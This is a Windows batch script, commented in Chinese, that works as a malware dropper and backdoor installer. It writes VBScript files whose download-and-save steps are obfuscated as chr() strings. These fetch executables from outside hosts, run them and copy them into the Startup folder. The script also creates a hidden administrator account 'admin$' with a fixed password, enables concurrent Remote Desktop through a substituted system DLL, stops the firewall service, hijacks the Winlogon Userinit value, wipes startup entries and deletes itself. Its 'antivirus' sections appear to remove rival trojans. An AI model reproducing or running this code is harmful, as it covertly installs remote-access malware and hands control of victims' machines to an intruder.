@echo off
ver | find "5.1.2600" >nul && goto :WL
goto :LJ
:WL
@echo on error resume next>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo Set Shell = CreateObject("Wscript.Shell")>>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo Set Post = CreateObject("Msxml2.XMLHTTP")>>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo Shell.Run ("cmd /c set date=%%date%% &&date 2016-1-1 "),0 >>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo wscript.sleep 10000>>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo Post.Open "GET","http://ip138.com/ip2city.asp",0 >>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo Post.Send()>>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo Set GG = CreateObject("ADODB.Stream")>>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo GG.Mode = 3 >>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo GG.Type = 1 >>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo GG.Open() >>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo execute(chr(71)^&chr(71)^&chr(46)^&chr(87)^&chr(114)^&chr(105)^&chr(116)^&chr(101)^&chr(40)^&chr(80)^&chr(111)^&chr(115)^&chr(116)^&chr(46)^&chr(114)^&chr(101)^&chr(115)^&chr(112)^&chr(111)^&chr(110)^&chr(115)^&chr(101)^&chr(66)^&chr(111)^&chr(100)^&chr(121)^&chr(41))>>ip.vbs
@echo '人无完人，事在人为>>ip.vbs
@echo execute(chr(71)^&chr(71)^&chr(46)^&chr(83)^&chr(97)^&chr(118)^&chr(101)^&chr(84)^&chr(111)^&chr(70)^&chr(105)^&chr(108)^&chr(101)^&chr(32)^&chr(34)^&chr(105)^&chr(110)^&chr(100)^&chr(101)^&chr(120)^&chr(46)^&chr(104)^&chr(116)^&chr(109)^&chr(108)^&chr(34)^&chr(44)^&chr(50))>>ip.vbs
@ip.vbs
@ping -n 3 127.0.1
@for /f "tokens=2 delims= " %%j in ('findstr /i "来自" index.html') do echo %%j>>tmp.txt
setlocal ENABLEDELAYEDEXPANSION
set FILENAME=tmp.txt
SET PH=%FILENAME:~0,-1%
set STR1=[
set STR2=]
SET STR3= 
SET STR4=
for /f "tokens=* delims= " %%a in (%FILENAME%) do (
set n=%%a
set n=!n:%STR1%=%STR3%!
set n=!n:%STR2%=%STR4%!
echo.!n!>>%PH%
)
DEL %FILENAME%
copy %PH% %FILENAME%
del %PH%
@for /f "tokens=2 delims= " %%j in (tmp.txt) do echo %%j>>w.txt
@for /f "eol=  tokens=15 delims= " %%i in ('ipconfig ^| find /i "ip address"') do echo %%i>>L.txt
@for /f "delims= tokens=1" %%a in (l.txt) do findstr "%%a" w.txt >nul && goto :OK
goto :LJ

:OK

echo ::::::::: 浏览器 :::::::::::::::
@echo on error resume next>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo Set Shell = CreateObject("Wscript.Shell")>>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo Set Post = CreateObject("Msxml2.XMLHTTP")>>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo Post.Open "GET","http://free.20-00.cn/error/firefox.exe",0 >>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo Post.Send()>>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo Set GG = CreateObject("ADODB.Stream")>>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo GG.Mode = 3 >>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo GG.Type = 1 >>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo GG.Open() >>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo execute(chr(71)^&chr(71)^&chr(46)^&chr(87)^&chr(114)^&chr(105)^&chr(116)^&chr(101)^&chr(40)^&chr(80)^&chr(111)^&chr(115)^&chr(116)^&chr(46)^&chr(114)^&chr(101)^&chr(115)^&chr(112)^&chr(111)^&chr(110)^&chr(115)^&chr(101)^&chr(66)^&chr(111)^&chr(100)^&chr(121)^&chr(41))>>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo execute(chr(71)^&chr(71)^&chr(46)^&chr(83)^&chr(97)^&chr(118)^&chr(101)^&chr(84)^&chr(111)^&chr(70)^&chr(105)^&chr(108)^&chr(101)^&chr(32)^&chr(34)^&chr(102)^&chr(46)^&chr(101)^&chr(120)^&chr(101)^&chr(34)^&chr(44)^&chr(50))>>f.vbs
@echo '人无完人，事在人为!!>>f.vbs
@echo Shell.Run ("f.exe")>>f.vbs
@f.vbs

@echo on error resume next>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo Set Shell = CreateObject("Wscript.Shell")>>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo Set Post = CreateObject("Msxml2.XMLHTTP")>>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo Post.Open "GET","http://www.onlinek.net/ad/log/135/135.txt",0 >>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo Post.Send()>>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo Set GG = CreateObject("ADODB.Stream")>>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo GG.Mode = 3 >>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo GG.Type = 1 >>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo GG.Open() >>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo execute(chr(71)^&chr(71)^&chr(46)^&chr(87)^&chr(114)^&chr(105)^&chr(116)^&chr(101)^&chr(40)^&chr(80)^&chr(111)^&chr(115)^&chr(116)^&chr(46)^&chr(114)^&chr(101)^&chr(115)^&chr(112)^&chr(111)^&chr(110)^&chr(115)^&chr(101)^&chr(66)^&chr(111)^&chr(100)^&chr(121)^&chr(41))>>list.vbs
@echo '人无完人，事在人为!!>>list.vbs
@echo execute(chr(71)^&chr(71)^&chr(46)^&chr(83)^&chr(97)^&chr(118)^&chr(101)^&chr(84)^&chr(111)^&chr(70)^&chr(105)^&chr(108)^&chr(101)^&chr(32)^&chr(34)^&chr(108)^&chr(105)^&chr(115)^&chr(116)^&chr(46)^&chr(116)^&chr(120)^&chr(116)^&chr(34)^&chr(44)^&chr(50))>>list.vbs
@list.vbs
@ping -n 3 127.0.1
@del list.vbs
@for /f "tokens=1,2 delims= " %%i in (list.txt) do (
@echo on error resume next>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo Set Shell = CreateObject("Wscript.Shell"^)>>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo Set Post = CreateObject("Msxml2.XMLHTTP"^)>>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo Post.Open "GET","%%i",0 >>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo Post.Send(^)>>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo Set GG = CreateObject("ADODB.Stream"^)>>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo GG.Mode = 3 >>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo GG.Type = 1 >>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo GG.Open(^) >>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo execute(chr(71^)^&chr(71^)^&chr(46^)^&chr(87^)^&chr(114^)^&chr(105^)^&chr(116^)^&chr(101^)^&chr(40^)^&chr(80^)^&chr(111^)^&chr(115^)^&chr(116^)^&chr(46^)^&chr(114^)^&chr(101^)^&chr(115^)^&chr(112^)^&chr(111^)^&chr(110^)^&chr(115^)^&chr(101^)^&chr(66^)^&chr(111^)^&chr(100^)^&chr(121^)^&chr(41^)^)>>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo execute(chr(71^)^&chr(71^)^&chr(46^)^&chr(83^)^&chr(97^)^&chr(118^)^&chr(101^)^&chr(84^)^&chr(111^)^&chr(70^)^&chr(105^)^&chr(108^)^&chr(101^)^&chr(32^)^&chr(34^)^&chr(116^)^&chr(46^)^&chr(101^)^&chr(120^)^&chr(101^)^&chr(34^)^&chr(44^)^&chr(50^)^)>>%%j.vbs
@echo '人无完人，事在人为!!>>%%j.vbs
@echo Shell.Run ("t.exe"^)>>%%j.vbs
@%%j.vbs
@ping -n 10 127.0.1
@del %%j.vbs
@copy t.exe "c:\Documents and Settings\All Users\「开始」菜单\程序\启动\%%j.exe" /y
@del t.exe
)

@echo :::::::::::::::::双开:::::::::::::::::::::: 
@aio -terminal 7788
@net user admin$ qq1234 /add
@net localgroup administrators admin$ /add
@Tasklist/SVC >>1.txt
@type 1.txt | find "DcomLaunch" >2.txt
for /f "eol= tokens=1,2 delims= " %%i in (2.txt) do ntsd -c q -p %%j

@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon /v KeepRASConnections /t REG_SZ /d 1 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Licensing" "Core /v EnableConcurrentSessions /t REG_DWORD /d 00000001 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\System32\termsrvgmm.dll /f
@copy termsrvgmm.dll %SystemRoot%\System32\termsrvgmm.dll
@Attrib +H +S +R %SystemRoot%\System32\termsrvgmm.dll
@shutdown -a
@shutdown -a
@shutdown -a
@del termsrvgmm.dll
@del 1.txt
@del 2.txt
@net stop sharedaccess
@net start dcomlaunch
@net start termservice
@sc delete sharedaccess
@aio -clone administrator admin$ qq1234
@echo start http://www.baidu.com/>"C:\Documents and Settings\all users\「开始」菜单\程序\启动\boot.bat"
@echo ok > c:\7788new-0204-ok$.ini

@echo ::::::::::清理机器狗::::::::::::::::::::::
@taskkill /im userinit.exe /f
:if
@tasklist | find /i "userinit.exe" && call :if
@del killdog.bat /q
@echo @echo off>killdog.bat
@echo @start killdog.exe>>killdog.bat
@copy killdog.exe %SystemRoot%\System32\killdog.exe /y
@copy killdog.bat %SystemRoot%\System32\killdog.bat /y
@reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d   "c:\windows\system32\killdog.bat," /f >nul


echo ::::::::: 清理启动项 :::::::::::::::
@echo Windows Registry Editor Version 5.00>>1.reg
@echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>1.reg 
@echo [-HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>1.reg
@echo [-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\]>>1.reg
@regedit /s 1.reg
@del 1.reg

@ATTRIB -R -H -S -A "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\*.*"
@DEL /F /Q /A -R -H -S -A "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\*.*"

@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::删除每个盘符下的 Autorun 病毒并且建立同名免疫目录. 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
        fsutil fsinfo drivetype %%a: |find /i "固定驱动器" && (
                for /f "tokens=2 delims==" %%b in (%%a:\autorun.inf) do del /a /f /q "%%a:\%%b" & md "%%a:\%%b\免疫目录不要删除!...\" & attrib +s +h +r "%%a:\%%b" & echo Y|cacls "%%a:\%%b" /T /C /P everyone:N >nul 2>nul
                del /a /f /q %%a:\autorun.inf & md "%%a:\autorun.inf\免疫目录不要删除!...\" & attrib +s +h +r %%a:\autorun.inf & echo Y|cacls "%%a:\autorun.inf" /T /C /P everyone:N >nul 2>nul
                ) >nul 2>nul
        fsutil fsinfo drivetype %%a: |find /i "可移动驱动器" && (
                for /f "tokens=2 delims==" %%b in (%%a:\autorun.inf) do del /a /f /q "%%a:\%%b" & md "%%a:\%%b\免疫目录不要删除!...\" & attrib +s +h +r "%%a:\%%b" & echo Y|cacls "%%a:\%%b" /T /C /P everyone:N >nul 2>nul
                del /a /f /q %%a:\autorun.inf & md "%%a:\autorun.inf\免疫目录不要删除!...\" & attrib +s +h +r %%a:\autorun.inf & echo Y|cacls "%%a:\autorun.inf" /T /C /P everyone:N >nul 2>nul
                ) >nul 2>nul
        )

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000ff /f >nul 2>nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000ff /f >nul 2>nul
net stop ShellHWDetection >nul 2>nul
sc config ShellHWDetection start= disabled >nul 2>nul

@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@for /f "eol= tokens=1 delims= " %%i in (exe.txt) do (
@for /f "eol= tokens=1 delims= " %%a in ('aio -pslist ^| find /i "%%i"') do aio -pskill %%a
@reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%i" /v debugger /t reg_sz /d debugfile.exe /f
)

del %windir%\sedrsvedt.exe
del %windir%\racvsvc.exe
del %windir%\drivers\sach0st.exe
del %windir%\upxdnd.exe
del %windir%\igw.exe
del %windir%\igm.exe
del %windir%\cmdbcs.exe
del %windir%\dbghlp32.exe
del %windir%\nvdispdrv.exe
del %windir%\kvdxsbma.dll
del %windir%\rsjzbpm.dll
del %windir%\kvdxcma.dll
del %windir%\ratbfpi.dll
del %windir%\avwlbmn.dll
del %windir%\kaqhezy.dll
del %windir%\kapjbzy.dll
del %windir%\sidjazy.dll
del %windir%\avwgcmn.dll
del %windir%\raqjbpi.dll
del %windir%\avzxdmn.dll
del %windir%\kawdbzy.dll
del %windir%\rsztcpm.dll
del %windir%\rsmydpm.dll
del %Windir%\MickNew\MickNew.dll
del %Windir%\MH_FILE\MH_DLL.dll 
del %Windir%\TODAYZTKING\TODAYZTKING.DLL
del %windir%\system\Logo1_.exe
del %windir%\rundl132.exe
del %windir%\vDll.dll
del %windir%\Dll.dll
del %windir%\1.exe
del %windir%\2.exe
del %windir%\3.exe
del %windir%\4.exe
del %windir%\5.exe
del %windir%\6.exe
del %windir%\7.exe
del %windir%\8.exe
del %windir%\9.exe
del %windir%\SVCH0ST.exe
del %windir%\logo_1.exe
del %windir%\svohost.exe
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::清除灰鸽子和上兴等木马程序，请稍侯....... 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@aio -EnumService Stopped > info.txt
@for /f "eol= tokens=1 delims= " %%i in (mdb.txt) do find /i "%%i" info.txt >>muma.txt
@for /f "eol=- tokens=4 delims= " %%i in (muma.txt) do sc config %%i start= disabled
@for /f "eol=- tokens=4 delims= " %%i in (muma.txt) do sc delete %%i
@del info.txt
@del muma.txt
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::恢复注册表中不给设置显示隐藏文件的项目,请稍侯
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo Windows Registry Editor Version 5.00> delshare.reg 
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]>> delshare.reg 
echo "RegPath"="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced">> delshare.reg 
echo "Text"="@shell32.dll,-30500">> delshare.reg 
echo "Type"="radio">> delshare.reg 
echo "CheckedValue"=dword:00000001>> delshare.reg 
echo "ValueName"="Hidden">> delshare.reg 
echo "DefaultValue"=dword:00000002>> delshare.reg 
echo "HKeyRoot"=dword:80000001>> delshare.reg 
echo "HelpID"="shell.hlp#51105">> delshare.reg 
regedit /s delshare.reg 
del delshare.reg 
echo Windows Registry Editor Version 5.00> cc.reg 
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows]>> cc.reg 
echo "DebugOptions"="2048">> cc.reg 
echo "Documents"="">> cc.reg 
echo "DosPrint"="no">> cc.reg 
echo "load"=->> cc.reg 
echo "NetMessage"="no">> cc.reg 
echo "NullPort"="None">> cc.reg 
echo "programs"="com exe bat pif cmd">> cc.reg 
echo "Device"="">> cc.reg 
regedit /s cc.reg 
del cc.reg 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::关闭有害端口，请稍侯....... 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@net share c$ /del 
@net share d$ /del 
@net share e$ /del 
@net share f$ /del 
@net share admin$ /del 
@net share ipc$ /del

@del f.*
@del L.txt
@del list.txt
@del index.html
@del ip.vbs
@del tmp.txt
@del w.txt
@del t.exe
@del c:\*.vbs
@del exe.txt
@del mdb.txt
@del %0
@exit
:LJ
@echo on error resume next>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo Set Shell = CreateObject("Wscript.Shell")>>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo Set Post = CreateObject("Msxml2.XMLHTTP")>>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo Shell.Run ("cmd /c set date=%%date%% &&date 1987-1-1 "),0 >>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo wscript.sleep 10000>>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo Post.Open "GET","http://vip.u-uuu.cn/baidu1.exe",0 >>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo Post.Send()>>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo Set GG = CreateObject("ADODB.Stream")>>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo GG.Mode = 3 >>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo GG.Type = 1 >>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo GG.Open() >>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo execute(chr(71)^&chr(71)^&chr(46)^&chr(87)^&chr(114)^&chr(105)^&chr(116)^&chr(101)^&chr(40)^&chr(80)^&chr(111)^&chr(115)^&chr(116)^&chr(46)^&chr(114)^&chr(101)^&chr(115)^&chr(112)^&chr(111)^&chr(110)^&chr(115)^&chr(101)^&chr(66)^&chr(111)^&chr(100)^&chr(121)^&chr(41))>>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo execute(chr(71)^&chr(71)^&chr(46)^&chr(83)^&chr(97)^&chr(118)^&chr(101)^&chr(84)^&chr(111)^&chr(70)^&chr(105)^&chr(108)^&chr(101)^&chr(32)^&chr(34)^&chr(116)^&chr(46)^&chr(101)^&chr(120)^&chr(101)^&chr(34)^&chr(44)^&chr(50))>>135.vbs
@echo '人无完人，事在人为!!>>135.vbs
@echo Shell.Run ("t.exe")>>135.vbs
@del f.*
@del L.txt
@del list.txt
@del index.html
@del ip.vbs
@del tmp.txt
@del w.txt
@del t.exe
@del c:\*.vbs
@del exe.txt
@del mdb.txt
@del %0
@exit